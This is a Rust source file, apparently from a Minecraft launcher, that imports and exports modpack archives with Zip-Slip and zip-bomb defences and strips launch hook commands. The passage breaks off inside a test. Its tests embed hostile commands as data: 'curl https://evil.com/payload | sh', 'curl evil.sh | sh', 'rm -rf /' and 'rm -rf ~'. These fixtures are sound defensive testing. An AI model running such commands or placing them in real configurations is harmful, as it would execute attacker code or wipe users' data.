//! Instance import/export (`.zip`, `.mrpack`, CurseForge `.zip`, MultiMC/Prism `.zip`),
//! strict Zip-Slip and Zip-Bomb protection, hook sanitization, and screenshots management.

use std::collections::BTreeMap;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Component, Path, PathBuf};

use chrono::Utc;
use mq_core::{resolve_safe_path, InstanceId, ModLoaderKind, MqError, MqResult};
use serde::{Deserialize, Serialize};
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

use crate::manifest::{InstanceManifest, INSTANCE_MANIFEST_FILE, INSTANCE_SUBDIRS};

/// Maximum number of entries allowed when importing an instance archive (`32,768`).
const MAX_IMPORT_ZIP_ENTRIES: usize = 32_768;
/// Maximum uncompressed size of a single archive entry (`512 MiB`).
const MAX_IMPORT_ENTRY_BYTES: u64 = 512 * 1024 * 1024;
/// Maximum cumulative uncompressed size across an imported archive (`4 GiB`).
const MAX_IMPORT_TOTAL_BYTES: u64 = 4 * 1024 * 1024 * 1024;
/// Maximum compression ratio (`200:1`) for entries >= `256 KiB`.
const MAX_IMPORT_COMPRESSION_RATIO: u64 = 200;
const MIN_BYTES_FOR_RATIO_CHECK: u64 = 256 * 1024;
const STREAM_CHUNK_SIZE: usize = 64 * 1024;

/// Detected archive format when importing a local modpack or instance archive.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ImportedArchiveFormat {
    /// Native MQ portable instance archive containing `instance.toml`.
    MqNative,
    /// Modrinth `.mrpack` archive containing `modrinth.index.json`.
    ModrinthMrpack,
    /// CurseForge modpack `.zip` archive containing `manifest.json`.
    CurseForgeZip,
    /// MultiMC / Prism Launcher instance archive containing `instance.cfg` and/or `mmc-pack.json`.
    MultiMcPrism,
}

/// Detailed result returned by [`import_instance_archive_detailed`].
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ImportedInstanceOutcome {
    pub manifest: InstanceManifest,
    pub format: ImportedArchiveFormat,
    pub instance_dir: PathBuf,
    /// Dangerous hook commands (`PreLaunchCommand`, `PostExitCommand`, `WrapperCommand`, `wrapper_cmd`)
    /// that were ignored and stripped during import.
    pub ignored_dangerous_hooks: Vec<String>,
}

/// Screenshot metadata found inside `<instance_dir>/screenshots/`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ScreenshotInfo {
    pub file_name: String,
    pub path: PathBuf,
    pub size_bytes: u64,
    pub created_at: chrono::DateTime<Utc>,
}

/// Lists all screenshots inside `<instance_dir>/screenshots/`, sorted newest first.
pub fn list_screenshots(instance_dir: &Path) -> MqResult<Vec<ScreenshotInfo>> {
    let scr_dir = instance_dir.join("screenshots");
    if !scr_dir.is_dir() {
        return Ok(Vec::new());
    }

    let mut screenshots = Vec::new();
    for entry in fs::read_dir(&scr_dir)?.flatten() {
        let path = entry.path();
        if path.is_file() {
            let is_img = path
                .extension()
                .and_then(|e| e.to_str())
                .map(|ext| ext.eq_ignore_ascii_case("png") || ext.eq_ignore_ascii_case("jpg"))
                .unwrap_or(false);

            if is_img {
                let file_name = entry.file_name().to_string_lossy().into_owned();
                let meta = entry.metadata()?;
                let size_bytes = meta.len();
                let created_at: chrono::DateTime<Utc> = meta
                    .modified()
                    .unwrap_or_else(|_| std::time::SystemTime::now())
                    .into();

                screenshots.push(ScreenshotInfo {
                    file_name,
                    path,
                    size_bytes,
                    created_at,
                });
            }
        }
    }

    screenshots.sort_by_key(|a| std::cmp::Reverse(a.created_at));
    Ok(screenshots)
}

/// Exports an instance directory into a portable standalone `.zip` archive.
pub fn export_instance_to_zip(instance_dir: &Path, out_zip_path: &Path) -> MqResult<()> {
    if !instance_dir.is_dir() {
        return Err(MqError::Internal(format!(
            "instance directory not found: {}",
            instance_dir.display()
        )));
    }

    if let Some(p) = out_zip_path.parent() {
        fs::create_dir_all(p)?;
    }

    let file = File::create(out_zip_path)?;
    let mut zip = ZipWriter::new(file);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    // List of subdirectories to include in portable instance export
    let allowed_dirs = ["mods", "config", "resourcepacks", "shaderpacks", "saves"];

    for dir_name in allowed_dirs {
        let sub = instance_dir.join(dir_name);
        if sub.is_dir() {
            add_dir_to_zip(&mut zip, instance_dir, &sub, options)?;
        }
    }

    // Include manifest and options if present
    for fname in [INSTANCE_MANIFEST_FILE, "options.txt", "servers.dat"] {
        let fpath = instance_dir.join(fname);
        if fpath.is_file() {
            zip.start_file(fname, options).map_err(|e| {
                MqError::Internal(format!("failed starting file {fname} in ZIP: {e}"))
            })?;
            let mut f = File::open(&fpath)?;
            std::io::copy(&mut f, &mut zip)?;
        }
    }

    zip.finish()
        .map_err(|e| MqError::Internal(format!("failed finalizing export ZIP archive: {e}")))?;

    Ok(())
}

fn add_dir_to_zip<W: Write + std::io::Seek>(
    zip: &mut ZipWriter<W>,
    base_dir: &Path,
    current_dir: &Path,
    options: SimpleFileOptions,
) -> MqResult<()> {
    for entry in fs::read_dir(current_dir)?.flatten() {
        let path = entry.path();
        let relative = path
            .strip_prefix(base_dir)
            .map_err(|e| MqError::Internal(format!("strip prefix failed: {e}")))?;
        let name_str = relative.to_string_lossy().replace('\\', "/");

        if path.is_dir() {
            zip.add_directory(&name_str, options)
                .map_err(|e| MqError::Internal(format!("failed adding dir to ZIP: {e}")))?;
            add_dir_to_zip(zip, base_dir, &path, options)?;
        } else if path.is_file() {
            zip.start_file(&name_str, options)
                .map_err(|e| MqError::Internal(format!("failed starting file in ZIP: {e}")))?;
            let mut f = File::open(&path)?;
            std::io::copy(&mut f, zip)?;
        }
    }
    Ok(())
}

const fn is_unix_symlink_mode(mode: u32) -> bool {
    (mode & 0o170000) == 0o120000
}

fn validate_entry_path_strict(
    base_dir: &Path,
    raw_name: &str,
    unix_mode: Option<u32>,
) -> MqResult<PathBuf> {
    if let Some(mode) = unix_mode {
        if is_unix_symlink_mode(mode) {
            return Err(MqError::ZipSlip {
                entry: raw_name.to_owned(),
            });
        }
    }
    if raw_name.is_empty()
        || raw_name.contains('\0')
        || raw_name.starts_with('/')
        || raw_name.starts_with('\\')
    {
        return Err(MqError::ZipSlip {
            entry: raw_name.to_owned(),
        });
    }
    let bytes = raw_name.as_bytes();
    if bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
        return Err(MqError::ZipSlip {
            entry: raw_name.to_owned(),
        });
    }
    for seg in raw_name.split(['/', '\\']) {
        if seg == ".." || seg == "." {
            return Err(MqError::ZipSlip {
                entry: raw_name.to_owned(),
            });
        }
    }
    let normalized = raw_name.replace('\\', "/");
    let trimmed = normalized.trim_end_matches('/');
    if trimmed.is_empty() {
        return Err(MqError::ZipSlip {
            entry: raw_name.to_owned(),
        });
    }
    for comp in Path::new(trimmed).components() {
        match comp {
            Component::Normal(part) if !part.is_empty() && part != "." && part != ".." => {}
            _ => {
                return Err(MqError::ZipSlip {
                    entry: raw_name.to_owned(),
                });
            }
        }
    }
    resolve_safe_path(base_dir, trimmed)
}

#[derive(Debug, Deserialize)]
struct MrpackMiniIndex {
    #[serde(default)]
    name: String,
    #[serde(default)]
    dependencies: BTreeMap<String, String>,
}

#[derive(Debug, Deserialize)]
struct CfMiniManifest {
    #[serde(default)]
    name: String,
    minecraft: CfMiniMinecraft,
    #[serde(default)]
    overrides: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct CfMiniMinecraft {
    #[serde(default)]
    version: String,
    #[serde(rename = "modLoaders", default)]
    mod_loaders: Vec<CfMiniLoader>,
}

#[derive(Debug, Deserialize)]
struct CfMiniLoader {
    #[serde(default)]
    id: String,
}

#[derive(Debug, Default, Deserialize)]
struct MmcPackJson {
    #[serde(default)]
    components: Vec<MmcComponent>,
}

#[derive(Debug, Default, Deserialize)]
struct MmcComponent {
    #[serde(default)]
    uid: String,
    #[serde(default)]
    version: String,
}

fn parse_mmc_pack(json_str: &str) -> (Option<String>, ModLoaderKind, Option<String>) {
    let Ok(parsed) = serde_json::from_str::<MmcPackJson>(json_str) else {
        return (None, ModLoaderKind::Vanilla, None);
    };
    let mut mc_version = None;
    let mut loader = ModLoaderKind::Vanilla;
    let mut loader_version = None;

    for comp in parsed.components {
        let uid = comp.uid.trim();
        let ver = comp.version.trim();
        if ver.is_empty() {
            continue;
        }
        match uid {
            "net.minecraft" => {
                mc_version = Some(ver.to_owned());
            }
            "net.fabricmc.fabric-loader" => {
                loader = ModLoaderKind::Fabric;
                loader_version = Some(ver.to_owned());
            }
            "org.quiltmc.quilt-loader" => {
                loader = ModLoaderKind::Quilt;
                loader_version = Some(ver.to_owned());
            }
            "net.neoforged" => {
                loader = ModLoaderKind::NeoForge;
                loader_version = Some(ver.to_owned());
            }
            "net.minecraftforge" => {
                loader = ModLoaderKind::Forge;
                loader_version = Some(ver.to_owned());
            }
            _ => {}
        }
    }
    (mc_version, loader, loader_version)
}

#[derive(Debug, Default)]
struct SanitizedMmcCfg {
    sanitized_content: String,
    name: Option<String>,
    min_mem_mb: Option<u32>,
    max_mem_mb: Option<u32>,
    jvm_args: Vec<String>,
    ignored_hooks: Vec<String>,
}

fn sanitize_and_parse_instance_cfg(raw_cfg: &str) -> SanitizedMmcCfg {
    let mut out = SanitizedMmcCfg::default();
    let mut sanitized_lines = Vec::new();

    for line in raw_cfg.lines() {
        let trimmed = line.trim();
        if let Some((raw_key, raw_val)) = trimmed.split_once('=') {
            let key = raw_key.trim();
            let val = raw_val.trim();
            if key.eq_ignore_ascii_case("PreLaunchCommand")
                || key.eq_ignore_ascii_case("PostExitCommand")
                || key.eq_ignore_ascii_case("WrapperCommand")
            {
                tracing::warn!(
                    "[SECURITY] Disabled dangerous hook in imported instance.cfg: {trimmed}"
                );
                out.ignored_hooks.push(trimmed.to_owned());
                sanitized_lines.push(format!("# DISABLED BY MQ SECURITY: {line}"));
                continue;
            }
            if key.eq_ignore_ascii_case("name") && !val.is_empty() {
                out.name = Some(val.to_owned());
            } else if key.eq_ignore_ascii_case("MinMemAlloc") {
                if let Ok(mb) = val.parse::<u32>() {
                    if mb > 0 {
                        out.min_mem_mb = Some(mb);
                    }
                }
            } else if key.eq_ignore_ascii_case("MaxMemAlloc") {
                if let Ok(mb) = val.parse::<u32>() {
                    if mb > 0 {
                        out.max_mem_mb = Some(mb);
                    }
                }
            } else if key.eq_ignore_ascii_case("JvmArgs") && !val.is_empty() {
                out.jvm_args = val.split_whitespace().map(str::to_owned).collect();
            }
        }
        sanitized_lines.push(line.to_owned());
    }

    out.sanitized_content = sanitized_lines.join("\n");
    out
}

/// Imports an instance from a local `.mrpack`, CurseForge `.zip`, MultiMC/Prism `.zip`,
/// or native MQ `.zip` archive into `<instances_root>/<slug>`.
///
/// Enforces strict Zip-Slip, symlink, and Zip-Bomb protection, and ignores any dangerous
/// `PreLaunchCommand` / `PostExitCommand` / `WrapperCommand` / `wrapper_cmd` hooks with a warning.
pub fn import_instance_from_zip(
    zip_path: &Path,
    instances_root: &Path,
    override_name: Option<&str>,
) -> MqResult<InstanceManifest> {
    import_instance_archive_detailed(zip_path, instances_root, override_name).map(|o| o.manifest)
}

/// Imports a local archive (`.mrpack`, CurseForge `.zip`, MultiMC/Prism `.zip`, or MQ `.zip`)
/// and returns full [`ImportedInstanceOutcome`] metadata including detected format and ignored hooks.
pub fn import_instance_archive_detailed(
    zip_path: &Path,
    instances_root: &Path,
    override_name: Option<&str>,
) -> MqResult<ImportedInstanceOutcome> {
    if !zip_path.is_file() {
        return Err(MqError::Internal(format!(
            "archive file not found: {}",
            zip_path.display()
        )));
    }

    let default_name = zip_path
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("ImportedInstance");
    let target_name = override_name.unwrap_or(default_name);
    let slug = InstanceId::sanitize_slug(target_name);

    let dest_dir = instances_root.join(slug.as_str());
    if dest_dir.exists() {
        return Err(MqError::InstanceAlreadyExists(slug.to_string()));
    }

    let file = File::open(zip_path)?;
    let mut archive = ZipArchive::new(file)
        .map_err(|e| MqError::Archive(format!("failed opening import ZIP archive: {e}")))?;

    if archive.len() > MAX_IMPORT_ZIP_ENTRIES {
        return Err(MqError::Archive(format!(
            "zip-bomb detected: archive contains {} entries (limit: {MAX_IMPORT_ZIP_ENTRIES})",
            archive.len()
        )));
    }

    // 1. Pre-validate every entry against Zip-Slip, symlinks, and Zip-Bomb headers before creating dest_dir.
    let dummy_base = Path::new(".");
    let mut total_declared_uncompressed = 0u64;
    let mut normalized_names = Vec::with_capacity(archive.len());

    for idx in 0..archive.len() {
        let entry = archive
            .by_index_raw(idx)
            .map_err(|e| MqError::Archive(format!("corrupt entry {idx} in ZIP: {e}")))?;
        let raw_name = entry.name().to_owned();
        if entry.is_symlink() {
            return Err(MqError::ZipSlip { entry: raw_name });
        }
        validate_entry_path_strict(dummy_base, &raw_name, entry.unix_mode())?;

        let uncomp = entry.size();
        let comp = entry.compressed_size();
        if uncomp > MAX_IMPORT_ENTRY_BYTES {
            return Err(MqError::Archive(format!(
                "zip-bomb detected: entry '{raw_name}' uncompressed size {uncomp} exceeds limit {MAX_IMPORT_ENTRY_BYTES}"
            )));
        }
        total_declared_uncompressed = total_declared_uncompressed.saturating_add(uncomp);
        if total_declared_uncompressed > MAX_IMPORT_TOTAL_BYTES {
            return Err(MqError::Archive(format!(
                "zip-bomb detected: total uncompressed size {total_declared_uncompressed} exceeds limit {MAX_IMPORT_TOTAL_BYTES}"
            )));
        }
        if uncomp >= MIN_BYTES_FOR_RATIO_CHECK
            && (comp == 0 || (uncomp / comp) > MAX_IMPORT_COMPRESSION_RATIO)
        {
            return Err(MqError::Archive(format!(
                "zip-bomb detected: entry '{raw_name}' exceeds compression ratio limit {MAX_IMPORT_COMPRESSION_RATIO}:1"
            )));
        }
        normalized_names.push(raw_name.replace('\\', "/"));
    }

    // 2. Detect optional common root folder wrapper (common in MultiMC / Prism exports like `MyPack/instance.cfg`).
    let root_markers = [
        INSTANCE_MANIFEST_FILE,
        "modrinth.index.json",
        "manifest.json",
        "instance.cfg",
        "mmc-pack.json",
    ];
    let has_root_marker = normalized_names.iter().any(|n| {
        let clean = n.trim_matches('/');
        root_markers.contains(&clean)
    });

    let strip_wrapper_prefix: Option<String> = if !has_root_marker {
        let mut first_segments = normalized_names.iter().filter_map(|n| {
            let clean = n.trim_matches('/');
            clean.split('/').next().filter(|s| !s.is_empty())
        });
        if let Some(first) = first_segments.next() {
            if first_segments.all(|s| s == first) {
                let candidate_prefix = format!("{first}/");
                let has_nested_marker = normalized_names.iter().any(|n| {
                    if let Some(rest) = n.strip_prefix(&candidate_prefix) {
                        root_markers.contains(&rest.trim_matches('/'))
                    } else {
                        false
                    }
                });
                if has_nested_marker {
                    Some(candidate_prefix)
                } else {
                    None
                }
            } else {
                None
            }
        } else {
            None
        }
    } else {
        None
    };

    let effective_rel = |norm: &str| -> String {
        let s = match &strip_wrapper_prefix {
            Some(pref) => norm.strip_prefix(pref.as_str()).unwrap_or(norm),
            None => norm,
        };
        s.trim_matches('/').to_owned()
    };

    let has_file = |target: &str| -> bool {
        normalized_names
            .iter()
            .any(|n| effective_rel(n).eq_ignore_ascii_case(target))
    };

    let format = if has_file(INSTANCE_MANIFEST_FILE) {
        ImportedArchiveFormat::MqNative
    } else if has_file("modrinth.index.json") {
        ImportedArchiveFormat::ModrinthMrpack
    } else if has_file("manifest.json") {
        ImportedArchiveFormat::CurseForgeZip
    } else if has_file("instance.cfg") || has_file("mmc-pack.json") {
        ImportedArchiveFormat::MultiMcPrism
    } else {
        ImportedArchiveFormat::MqNative
    };

    fs::create_dir_all(&dest_dir)?;
    for sub in INSTANCE_SUBDIRS {
        fs::create_dir_all(dest_dir.join(sub))?;
    }

    // 3. Stream-extract archive entries according to the detected format.
    let mut buf = vec![0u8; STREAM_CHUNK_SIZE];
    let mut total_written = 0u64;

    let extract_pass = |archive: &mut ZipArchive<File>,
                        total_written: &mut u64,
                        buf: &mut [u8],
                        map_rel: &dyn Fn(&str) -> Option<String>|
     -> MqResult<()> {
        for i in 0..archive.len() {
            let mut entry = archive
                .by_index(i)
                .map_err(|e| MqError::Archive(format!("corrupt entry in ZIP: {e}")))?;

            let raw_name = entry.name().to_owned();
            let unix_mode = entry.unix_mode();
            let comp_size = entry.compressed_size();
            if entry.is_symlink() {
                return Err(MqError::ZipSlip { entry: raw_name });
            }

            let norm = raw_name.replace('\\', "/");
            let eff = effective_rel(&norm);
            if eff.is_empty() {
                continue;
            }

            let Some(mapped_rel) = map_rel(&eff) else {
                continue;
            };
            let mapped_trimmed = mapped_rel.trim_matches('/');
            if mapped_trimmed.is_empty() {
                continue;
            }

            let out_path = validate_entry_path_strict(&dest_dir, mapped_trimmed, unix_mode)?;

            if entry.is_dir() || norm.ends_with('/') {
                fs::create_dir_all(&out_path)?;
                continue;
            }

            if let Some(parent) = out_path.parent() {
                fs::create_dir_all(parent)?;
            }

            let mut out_file = File::create(&out_path)?;
            let mut entry_written = 0u64;
            loop {
                let n = entry.read(buf)?;
                if n == 0 {
                    break;
                }
                entry_written = entry_written.saturating_add(n as u64);
                *total_written = total_written.saturating_add(n as u64);

                if entry_written > MAX_IMPORT_ENTRY_BYTES || *total_written > MAX_IMPORT_TOTAL_BYTES
                {
                    drop(out_file);
                    let _ = fs::remove_dir_all(&dest_dir);
                    return Err(MqError::Archive(format!(
                        "zip-bomb detected while extracting '{raw_name}': size limit exceeded"
                    )));
                }
                if entry_written >= MIN_BYTES_FOR_RATIO_CHECK
                    && (comp_size == 0
                        || (entry_written / comp_size) > MAX_IMPORT_COMPRESSION_RATIO)
                {
                    drop(out_file);
                    let _ = fs::remove_dir_all(&dest_dir);
                    return Err(MqError::Archive(format!(
                        "zip-bomb detected while extracting '{raw_name}': compression ratio limit exceeded"
                    )));
                }

                out_file.write_all(&buf[..n])?;
            }
            out_file.flush()?;
        }
        Ok(())
    };

    match format {
        ImportedArchiveFormat::ModrinthMrpack => {
            // Pass 1: modrinth.index.json + overrides/
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                if eff.eq_ignore_ascii_case("modrinth.index.json") {
                    Some("modrinth.index.json".to_owned())
                } else {
                    eff.strip_prefix("overrides/").map(str::to_owned)
                }
            })?;
            // Pass 2: client-overrides/ overlaid on top of overrides/
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                eff.strip_prefix("client-overrides/").map(str::to_owned)
            })?;
        }
        ImportedArchiveFormat::CurseForgeZip => {
            // First extract manifest.json to inspect custom `overrides` folder name if any.
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                eff.eq_ignore_ascii_case("manifest.json")
                    .then(|| "manifest.json".to_owned())
            })?;
            let cf_overrides_prefix = fs::read_to_string(dest_dir.join("manifest.json"))
                .ok()
                .and_then(|s| serde_json::from_str::<CfMiniManifest>(&s).ok())
                .and_then(|m| m.overrides)
                .unwrap_or_else(|| "overrides".to_owned());
            let clean_pref = format!("{}/", cf_overrides_prefix.trim_matches('/'));
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                eff.strip_prefix(clean_pref.as_str()).map(str::to_owned)
            })?;
        }
        ImportedArchiveFormat::MultiMcPrism => {
            // Relocate `.minecraft/...` or `minecraft/...` directly into `dest_dir/...`
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                if let Some(stripped) = eff.strip_prefix(".minecraft/") {
                    Some(stripped.to_owned())
                } else if let Some(stripped) = eff.strip_prefix("minecraft/") {
                    Some(stripped.to_owned())
                } else {
                    Some(eff.to_owned())
                }
            })?;
        }
        ImportedArchiveFormat::MqNative => {
            extract_pass(&mut archive, &mut total_written, &mut buf, &|eff| {
                Some(eff.to_owned())
            })?;
        }
    }

    // 4. Sanitize any dangerous MultiMC / Prism `instance.cfg` hook commands in all formats.
    let mut ignored_dangerous_hooks = Vec::new();
    let mut parsed_mmc_cfg: Option<SanitizedMmcCfg> = None;

    let mmc_cfg_path = dest_dir.join("instance.cfg");
    if mmc_cfg_path.is_file() {
        if let Ok(cfg_content) = fs::read_to_string(&mmc_cfg_path) {
            let res = sanitize_and_parse_instance_cfg(&cfg_content);
            ignored_dangerous_hooks.extend(res.ignored_hooks.iter().cloned());
            let _ = fs::write(&mmc_cfg_path, &res.sanitized_content);
            parsed_mmc_cfg = Some(res);
        }
    }

    // 5. Build or load `InstanceManifest` (`instance.toml`).
    let manifest_path = dest_dir.join(INSTANCE_MANIFEST_FILE);
    let manifest = if manifest_path.is_file() {
        let content = fs::read_to_string(&manifest_path)?;
        let mut m: InstanceManifest = toml::from_str(&content).map_err(|e| {
            MqError::Internal(format!("invalid instance.toml in imported archive: {e}"))
        })?;
        m.name = target_name.to_string();
        m.id = slug;

        // Security: strip wrapper_cmd from imported instances to prevent arbitrary code execution
        if let Some(cmd) = m.wrapper_cmd.take() {
            tracing::warn!(
                "[SECURITY] Stripped wrapper_cmd '{cmd}' from imported instance '{}' to prevent arbitrary execution",
                m.name
            );
            ignored_dangerous_hooks.push(format!("wrapper_cmd={cmd}"));
        }

        m.save_to_dir(&dest_dir)?;
        m
    } else {
        let mut display_name = target_name.to_owned();
        let mut mc_version = "1.21.1".to_owned();
        let mut loader = ModLoaderKind::Vanilla;
        let mut loader_version = None;
        let mut modpack_source = None;

        match format {
            ImportedArchiveFormat::ModrinthMrpack => {
                if let Ok(raw) = fs::read_to_string(dest_dir.join("modrinth.index.json")) {
                    if let Ok(idx) = serde_json::from_str::<MrpackMiniIndex>(&raw) {
                        if override_name.is_none() && !idx.name.trim().is_empty() {
                            display_name = idx.name.trim().to_owned();
                        }
                        if let Some(mc) = idx.dependencies.get("minecraft") {
                            mc_version = mc.clone();
                        }
                        if let Some(v) = idx
                            .dependencies
                            .get("fabric-loader")
                            .or_else(|| idx.dependencies.get("fabric"))
                        {
                            loader = ModLoaderKind::Fabric;
                            loader_version = Some(v.clone());
                        } else if let Some(v) = idx
                            .dependencies
                            .get("quilt-loader")
                            .or_else(|| idx.dependencies.get("quilt"))
                        {
                            loader = ModLoaderKind::Quilt;
                            loader_version = Some(v.clone());
                        } else if let Some(v) = idx
                            .dependencies
                            .get("neoforge")
                            .or_else(|| idx.dependencies.get("neo-forge"))
                        {
                            loader = ModLoaderKind::NeoForge;
                            loader_version = Some(v.clone());
                        } else if let Some(v) = idx.dependencies.get("forge") {
                            loader = ModLoaderKind::Forge;
                            loader_version = Some(v.clone());
                        }
                        modpack_source = Some(format!("mrpack:{}", idx.name));
                    }
                }
            }
            ImportedArchiveFormat::CurseForgeZip => {
                if let Ok(raw) = fs::read_to_string(dest_dir.join("manifest.json")) {
                    if let Ok(cf) = serde_json::from_str::<CfMiniManifest>(&raw) {
                        if override_name.is_none() && !cf.name.trim().is_empty() {
                            display_name = cf.name.trim().to_owned();
                        }
                        if !cf.minecraft.version.trim().is_empty() {
                            mc_version = cf.minecraft.version.trim().to_owned();
                        }
                        for l in &cf.minecraft.mod_loaders {
                            let lower = l.id.to_ascii_lowercase();
                            if let Some(v) = lower.strip_prefix("fabric-") {
                                loader = ModLoaderKind::Fabric;
                                loader_version = Some(v.to_owned());
                                break;
                            } else if let Some(v) = lower.strip_prefix("quilt-") {
                                loader = ModLoaderKind::Quilt;
                                loader_version = Some(v.to_owned());
                                break;
                            } else if let Some(v) = lower.strip_prefix("neoforge-") {
                                loader = ModLoaderKind::NeoForge;
                                loader_version = Some(v.to_owned());
                                break;
                            } else if let Some(v) = lower.strip_prefix("forge-") {
                                loader = ModLoaderKind::Forge;
                                loader_version = Some(v.to_owned());
                                break;
                            }
                        }
                        modpack_source = Some(format!("curseforge:{}", cf.name));
                    }
                }
            }
            ImportedArchiveFormat::MultiMcPrism => {
                if let Some(ref cfg) = parsed_mmc_cfg {
                    if override_name.is_none() {
                        if let Some(ref n) = cfg.name {
                            display_name = n.clone();
                        }
                    }
                }
                if let Ok(raw) = fs::read_to_string(dest_dir.join("mmc-pack.json")) {
                    let (mmc_mc, mmc_loader, mmc_lver) = parse_mmc_pack(&raw);
                    if let Some(mc) = mmc_mc {
                        mc_version = mc;
                    }
                    loader = mmc_loader;
                    loader_version = mmc_lver;
                }
                modpack_source = Some(format!("multimc:{display_name}"));
            }
            ImportedArchiveFormat::MqNative => {}
        }

        let mut m = InstanceManifest::new(&display_name, mc_version, loader, loader_version);
        m.id = slug;
        m.modpack_source = modpack_source;
        if let Some(cfg) = parsed_mmc_cfg {
            if let Some(min_mb) = cfg.min_mem_mb {
                m.memory_min_mb = min_mb;
            }
            if let Some(max_mb) = cfg.max_mem_mb {
                m.memory_max_mb = max_mb;
            }
            if !cfg.jvm_args.is_empty() {
                m.jvm_args = cfg.jvm_args;
            }
        }
        m.wrapper_cmd = None;
        m.save_to_dir(&dest_dir)?;
        m
    };

    Ok(ImportedInstanceOutcome {
        manifest,
        format,
        instance_dir: dest_dir,
        ignored_dangerous_hooks,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_import_strips_wrapper_cmd_and_disables_mmc_hooks() {
        let tmp = tempfile::tempdir().unwrap();
        let zip_path = tmp.path().join("malicious.zip");
        let dest_root = tmp.path().join("instances");

        // Build a zip containing dangerous commands
        {
            let file = File::create(&zip_path).unwrap();
            let mut zip = ZipWriter::new(file);
            let options =
                SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

            zip.start_file("instance.toml", options).unwrap();
            let manifest_content = r#"
id = "malicious"
name = "Malicious Modpack"
mc_version = "1.20.1"
loader = "Fabric"
memory_min_mb = 1024
memory_max_mb = 4096
wrapper_cmd = "curl https://evil.com/payload | sh"
created_at = "2026-01-01T00:00:00Z"
playtime_secs = 0
lang_initialized = true
"#;
            zip.write_all(manifest_content.as_bytes()).unwrap();

            zip.start_file("instance.cfg", options).unwrap();
            let cfg_content =
                "name=Malicious\nPreLaunchCommand=rm -rf /\nPostExitCommand=echo done\nWrapperCommand=evil_wrap\n";
            zip.write_all(cfg_content.as_bytes()).unwrap();

            zip.finish().unwrap();
        }

        let outcome = import_instance_archive_detailed(&zip_path, &dest_root, None).unwrap();
        assert_eq!(
            outcome.manifest.wrapper_cmd, None,
            "wrapper_cmd must be stripped for safety"
        );
        assert_eq!(outcome.ignored_dangerous_hooks.len(), 4);

        let mmc_cfg = fs::read_to_string(dest_root.join("malicious").join("instance.cfg")).unwrap();
        assert!(mmc_cfg.contains("# DISABLED BY MQ SECURITY: PreLaunchCommand=rm -rf /"));
        assert!(mmc_cfg.contains("# DISABLED BY MQ SECURITY: PostExitCommand=echo done"));
        assert!(mmc_cfg.contains("# DISABLED BY MQ SECURITY: WrapperCommand=evil_wrap"));
    }

    #[test]
    fn test_import_multimc_prism_mrpack_and_curseforge_archives() {
        let tmp = tempfile::tempdir().unwrap();
        let dest_root = tmp.path().join("instances");

        // 1. MultiMC / Prism archive with top-level wrapper folder, `instance.cfg`, `mmc-pack.json`, and `.minecraft/mods/sodium.jar`
        let prism_zip = tmp.path().join("prism-pack.zip");
        {
            let file = File::create(&prism_zip).unwrap();
            let mut zw = ZipWriter::new(file);
            let opts = SimpleFileOptions::default();

            zw.start_file("MyPrismPack/instance.cfg", opts).unwrap();
            zw.write_all(
                b"InstanceType=OneSix\nname=Prism Speed Pack\nMinMemAlloc=2048\nMaxMemAlloc=6144\nPreLaunchCommand=curl evil.sh | sh\nPostExitCommand=rm -rf ~\nWrapperCommand=bad_wrapper\n",
            )
            .unwrap();

            let mmc_pack = serde_json::json!({
                "formatVersion": 1,
                "components": [
                    { "uid": "net.minecraft", "version": "1.21.1" },
                    { "uid": "net.fabricmc.fabric-loader", "version": "0.16.9" }
                ]
            });
            zw.start_file("MyPrismPack/mmc-pack.json", opts).unwrap();
            zw.write_all(mmc_pack.to_string().as_bytes()).unwrap();

            zw.start_file("MyPrismPack/.minecraft/mods/sodium.jar", opts)
                .unwrap();
            zw.write_all(b"sodium-jar").unwrap();
            zw.start_file("MyPrismPack/.minecraft/options.txt", opts)
                .unwrap();
            zw.write_all(b"fov:1.0\n").unwrap();
            zw.finish().unwrap();
        }

        let prism_out = import_instance_archive_detailed(&prism_zip, &dest_root, None).unwrap();
        assert_eq!(prism_out.format, ImportedArchiveFormat::MultiMcPrism);
        assert_eq!(prism_out.manifest.name, "Prism Speed Pack");
        assert_eq!(prism_out.manifest.mc_version, "1.21.1");
        assert_eq!(prism_out.manifest.loader, ModLoaderKind::Fabric);
        assert_eq!(prism_out.manifest.loader_version.as_deref(), Some("0.16.9"));
        assert_eq!(prism_out.manifest.memory_min_mb, 2048);
        assert_eq!(prism_out.manifest.memory_max_mb, 6144);
        assert_eq!(prism_out.manifest.wrapper_cmd, None);
        assert_eq!(prism_out.ignored_dangerous_hooks.len(), 3);
        assert!(prism_out.instance_dir.join("mods/sodium.jar").is_file());
        assert!(prism_out.instance_dir.join("options.txt").is_file());

        // 2. Local `.mrpack` import
        let mrpack_zip = tmp.path().join("local-fabulously.mrpack");
        {
            let file = File::create(&mrpack_zip).unwrap();
            let mut zw = ZipWriter::new(file);
            let opts = SimpleFileOptions::default();
            let idx = serde_json::json!({
                "formatVersion": 1,
                "game": "minecraft",
                "versionId": "6.0.0",
                "name": "Local Mrpack",
                "dependencies": {
                    "minecraft": "1.21.1",
                    "quilt-loader": "0.26.0"
                },
                "files": []
            });
            zw.start_file("modrinth.index.json", opts).unwrap();
            zw.write_all(idx.to_string().as_bytes()).unwrap();
            zw.start_file("overrides/config/base.toml", opts).unwrap();
            zw.write_all(b"a = 1\n").unwrap();
            zw.start_file("client-overrides/config/base.toml", opts)
                .unwrap();
            zw.write_all(b"a = 2\n").unwrap();
            zw.finish().unwrap();
        }

        let mr_out = import_instance_archive_detailed(&mrpack_zip, &dest_root, None).unwrap();
